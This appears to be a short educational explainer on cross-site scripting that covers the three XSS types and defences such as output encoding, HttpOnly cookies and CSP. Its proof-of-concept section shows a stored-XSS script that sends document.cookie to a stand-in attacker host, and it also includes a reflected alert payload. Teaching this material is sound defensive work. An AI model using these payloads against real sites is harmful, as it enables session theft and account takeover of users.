---
title: "Cross-Site Scripting (XSS)"
symbol: "Xs"
category: "Injection"
readTime: 2
tldr: "Malicious JavaScript gets injected into a web page and executes in the browsers of visiting users."
red: "Inject script tags to steal session cookies, capture keystrokes, or redirect users to credential harvesting sites."
blue: "Contextually encode all user output before rendering and enforce strict Content Security Policy (CSP)."
next: "path-traversal"
---

### What is XSS?
Cross-Site Scripting (XSS) occurs when an application includes untrusted user data in a web page without properly validating or encoding it. As a result, the victim's browser treats the user input as executable code rather than plain text.

Because the injected script runs inside the victim's authenticated session, it has full access to the Document Object Model (DOM), local storage, and session cookies.

### The three primary types

#### 1. Stored XSS
The malicious script is permanently stored in the application's database (for example, in a blog comment or user profile field). Whenever another user views the profile, the script executes automatically.

#### 2. Reflected XSS
The payload is delivered inside a request parameter (such as a search query) and reflected immediately in the server response:
```http
GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
```
If the search results page renders `Results for: <script>...`, the script executes.

#### 3. DOM-based XSS
The vulnerability exists entirely within client-side JavaScript. Untrusted data from a "source" (like `location.hash`) is passed into an unsafe "sink" (like `element.innerHTML` or `eval()`) without server involvement.

### A tiny proof of concept
An attacker submits this comment on a message board:
```html
<script>
  fetch('https://attacker.local/steal?c=' + encodeURIComponent(document.cookie));
</script>
```
When the site administrator views the comment, their session cookie is silently transmitted to the attacker's server, enabling full account takeover.

### How to defend against it
1. **Context-aware output encoding**: Escape characters like `<`, `>`, `&`, `"`, and `'` so the browser renders them as characters rather than HTML tags (`&lt;`, `&gt;`).
2. **HttpOnly cookie flag**: Set the `HttpOnly` attribute on session cookies so JavaScript cannot read them via `document.cookie`.
3. **Content Security Policy (CSP)**: Deploy a strict CSP header restricting where scripts can be loaded and executed from.
